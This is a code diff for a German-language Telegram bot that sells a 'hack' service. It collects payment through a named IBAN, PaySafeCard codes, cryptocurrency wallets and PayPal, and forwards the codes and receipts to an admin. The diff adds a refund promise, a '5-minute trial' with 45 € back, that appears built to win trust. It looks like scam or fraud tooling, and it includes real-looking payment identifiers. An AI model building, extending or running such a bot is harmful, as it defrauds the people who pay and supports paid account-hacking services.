@@ -83,7 +83,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = user.id
     uname = user.username or ""
 
-    # ✅ User speichern (id + username)
     with open(USERS_FILE, "a", encoding="utf-8") as f:
         f.write(f"{uid} {uname}\n")
 
@@ -99,7 +98,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ---- ADMIN: /listusers ----
 async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_CHAT_ID:
-        return  # ❌ nur Admin
+        return
 
     if not os.path.exists(USERS_FILE):
         await update.message.reply_text("Noch keine Nutzer gespeichert.")
@@ -182,37 +181,49 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     cmd = query.data
 
+    info_refund = (
+        "\n\n⚠️ <b>Wichtig:</b> Bei deiner <u>ersten Zahlung</u> hast du eine "
+        "<b>5 Minuten Testphase</b>. Wenn du in dieser Zeit stornierst, bekommst du <b>45 €</b> zurück.\n\n"
+        "📌 <b>Verwendungszweck:</b> Gib <u>deinen Telegram-Namen</u> an!"
+    )
+
     if cmd == "pay_bank":
         text = (
             "🏦 <b>Banküberweisung</b>\n\n"
             "Empfänger: Hedwig Theres\n"
-            "IBAN: <code>IE21PPSE99038051722125</code>\n\n"
-            "Bitte sende hier ein Foto deines Zahlungsbelegs."
+            "IBAN: <code>IE21PPSE99038051722125</code>\n"
+            f"{info_refund}"
+            "\n\nBitte sende hier ein Foto deines Zahlungsbelegs."
         )
     elif cmd == "pay_paysafe":
         text = (
             "💳 <b>PaySafeCard</b>\n\n"
             "Bitte sende deinen 16-stelligen Code im Format:\n"
-            "<code>0000-0000-0000-0000</code>\n\n"
-            "Der Code wird überprüft und weitergeleitet."
+            "<code>0000-0000-0000-0000</code>\n"
+            f"{info_refund}"
+            "\n\nDer Code wird überprüft und weitergeleitet."
         )
     elif cmd == "pay_crypto":
         text = (
             "🪙 <b>Kryptowährungen</b>\n\n"
             "- BTC: <code>bc1q72jdez5v3m7dvtlpq8lyw6u8zpql6al6flwwyr</code>\n"
             "- ETH: <code>0xb213CaF608B8760F0fF3ea45923271c35EeA68F5</code>\n"
-            "- LTC: <code>ltc1q8wxmmw7mclyk55fcyet98ul60f4e9n7d9mejp3</code>\n\n"
-            "Bitte sende hier ein Foto deines Zahlungsbelegs."
+            "- LTC: <code>ltc1q8wxmmw7mclyk55fcyet98ul60f4e9n7d9mejp3</code>\n"
+            f"{info_refund}"
+            "\n\nBitte sende hier ein Foto deines Zahlungsbelegs."
         )
     elif cmd == "pay_paypal":
         text = (
             "🪙 <b>PayPal</b>\n\n"
             "Empfänger: nisakamehrun@gmail.com\n"
-            "Verwendungszweck: Dein Telegram-Name.\n"
-            "Bitte sende hier ein Foto deines Zahlungsbelegs."
+            f"{info_refund}"
+            "\n\nBitte sende hier ein Foto deines Zahlungsbelegs."
         )
     elif cmd == "pay":
         await pay(update, context)
+        return
+    else:
+        await query.edit_message_text("Ungültige Auswahl.")
         return
 
     keyboard = [[InlineKeyboardButton("⬅️ Zurück", callback_data="pay")]]
@@ -264,26 +275,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=msg, parse_mode=ParseMode.HTML)
         await update.message.reply_text("✅ Dein Paysafe-Code wurde erfolgreich gesendet!")
 
-# ---- MAIN ----
-def main():
-    application = ApplicationBuilder().token(TOKEN).build()
-
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("hack", hack))
-    application.add_handler(CommandHandler("pay", pay))
-    application.add_handler(CommandHandler("invite", invite))
-    application.add_handler(CommandHandler("redeem", redeem))
-    application.add_handler(CommandHandler("faq", faq))
-    application.add_handler(CommandHandler("listusers", list_users))
-
-    application.add_handler(CallbackQueryHandler(button_handler))
-    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-
-    print("✅ Bot läuft...")
-    application.run_polling()
-
-# ---- Dummy Invite/Redeem/FAQ ----
+# ---- DUMMY INVITE/REDEEM/FAQ ----
 async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = "🎁 Lade Freunde ein und erhalte einen kostenlosen Hack!\n\n🔗 https://t.me/+SFhf7LeMMOxlZGVk"
     await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
@@ -302,6 +294,25 @@ async def faq(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "💬 Mit /pay nach dem Hack."
     )
     await update.message.reply_text(faq_text, parse_mode=ParseMode.MARKDOWN)
+
+# ---- MAIN ----
+def main():
+    application = ApplicationBuilder().token(TOKEN).build()
+
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("hack", hack))
+    application.add_handler(CommandHandler("pay", pay))
+    application.add_handler(CommandHandler("invite", invite))
+    application.add_handler(CommandHandler("redeem", redeem))
+    application.add_handler(CommandHandler("faq", faq))
+    application.add_handler(CommandHandler("listusers", list_users))
+
+    application.add_handler(CallbackQueryHandler(button_handler))
+    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
+
+    print("✅ Bot läuft...")
+    application.run_polling()
 
 if __name__ == "__main__":
     keep_alive()
